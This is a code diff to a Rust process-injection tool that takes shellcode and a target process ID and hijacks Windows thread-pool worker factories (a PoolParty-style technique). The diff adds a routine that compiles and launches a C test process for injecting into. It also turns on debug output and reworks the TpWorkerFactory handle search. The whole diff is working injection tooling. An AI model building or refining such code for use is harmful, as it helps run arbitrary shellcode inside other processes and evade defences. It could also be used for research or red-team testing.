@@ -283,10 +283,76 @@ pub fn wrapper(shellcode: &[u8], pid: u32, variant: u32) -> String {
     match variant {
         1 => party_time(shellcode, pid),
         2 => party_time_2(shellcode, pid),
-        _ => panic!("Invalid variant number. Please provide a valid number."),
+        0 => create_test_process(), // Special case for creating a test process
+        _ => panic!("Invalid variant number. Please provide a valid number (0 for test process, 1, or 2)."),
     }
 }
 
+fn create_test_process() -> String {
+    use std::process::Command;
+    
+    // Create a simple C program that uses thread pools
+    let c_code = r#"
+#include <windows.h>
+#include <stdio.h>
+
+void CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
+    printf("Work callback executed!\\n");
+    Sleep(1000);
+}
+
+int main() {
+    printf("Test process started. PID: %d\\n", GetCurrentProcessId());
+    printf("Creating thread pool work items...\\n");
+    
+    // Create a thread pool work item
+    PTP_WORK work = CreateThreadpoolWork(WorkCallback, NULL, NULL);
+    if (work) {
+        printf("Thread pool work created successfully\\n");
+        SubmitThreadpoolWork(work);
+        Sleep(2000);
+        WaitForThreadpoolWorkCallbacks(work, FALSE);
+        CloseThreadpoolWork(work);
+    }
+    
+    printf("Test process will sleep for 60 seconds. You can now inject into PID %d\\n", GetCurrentProcessId());
+    Sleep(60000);
+    return 0;
+}
+"#;
+
+    // Write the C code to a temporary file
+    std::fs::write("test_process.c", c_code).expect("Failed to write test C file");
+    
+    // Try to compile it (requires Visual Studio or MinGW)
+    let compile_result = Command::new("cl")
+        .args(&["/Fe:test_process.exe", "test_process.c"])
+        .output();
+    
+    if compile_result.is_err() {
+        // Try with gcc if cl is not available
+        let gcc_result = Command::new("gcc")
+            .args(&["-o", "test_process.exe", "test_process.c"])
+            .output();
+        
+        if gcc_result.is_err() {
+            return String::from("Failed to compile test process. Please ensure you have a C compiler (Visual Studio or MinGW) installed.\n");
+        }
+    }
+    
+    // Start the test process
+    let process = Command::new("./test_process.exe")
+        .spawn();
+    
+    match process {
+        Ok(child) => {
+            format!("Test process created with PID: {}\nYou can now run: cargo run {} 1\n", child.id(), child.id())
+        }
+        Err(e) => {
+            format!("Failed to start test process: {}\n", e)
+        }
+    }
+}
 
 fn party_time(shellcode: &[u8], pid: u32) -> String {
     //println!("Hello, world!");
@@ -368,7 +434,7 @@ fn find_worker_factory_handle(process_handle: HANDLE) -> Result<HANDLE, NTSTATUS
             &mut return_length,
         );
 
-        //println!("Query status: {:x}, return length: {}", status, return_length);
+        println!("Query status: {:x}, return length: {}", status, return_length);
         
         if !NT_SUCCESS(status) {
             return Err(status);
@@ -381,9 +447,12 @@ fn find_worker_factory_handle(process_handle: HANDLE) -> Result<HANDLE, NTSTATUS
             &(*handle_snapshot).handles as *const HandleEntry,
             (*handle_snapshot).number_of_handles
         ) };
-        //println!("Number of handles: {}", handles.len());
+        println!("Number of handles found: {}", handles.len());
 
-        for handle_entry in handles {
+        let mut found_handle_types = std::collections::HashSet::new();
+        let mut worker_factory_handles = Vec::new();
+
+        for (i, handle_entry) in handles.iter().enumerate() {
             let mut duplicated_handle: HANDLE = std::ptr::null_mut();
     
         // Try to duplicate the handle
@@ -431,16 +500,29 @@ fn find_worker_factory_handle(process_handle: HANDLE) -> Result<HANDLE, NTSTATUS
             ) };
 
             if let Ok(name) = String::from_utf16(type_name) {
+                found_handle_types.insert(name.clone());
+                
                 if name == "TpWorkerFactory" {
-                    return Ok(duplicated_handle);
+                    println!("Found TpWorkerFactory handle at index {}", i);
+                    worker_factory_handles.push(duplicated_handle);
                 }
             }
+        } else {
+            unsafe { CloseHandle(duplicated_handle) };
         }
-
-        unsafe { CloseHandle(duplicated_handle) };
     }
 
-    Err(STATUS_NOT_FOUND)
+    // Print all found handle types for debugging
+    println!("Found handle types: {:?}", found_handle_types);
+    
+    if worker_factory_handles.is_empty() {
+        println!("No TpWorkerFactory handles found. The target process may not be using thread pools.");
+        println!("Try targeting a process that uses thread pools (e.g., explorer.exe, or a process that calls CreateThreadpoolWork)");
+        return Err(STATUS_NOT_FOUND);
+    }
+
+    // Return the first worker factory handle found
+    Ok(worker_factory_handles[0])
 }
     
 fn get_worker_factory_basic_info(worker_factory_handle: HANDLE) -> Result<WORKER_FACTORY_BASIC_INFORMATION, NTSTATUS> {
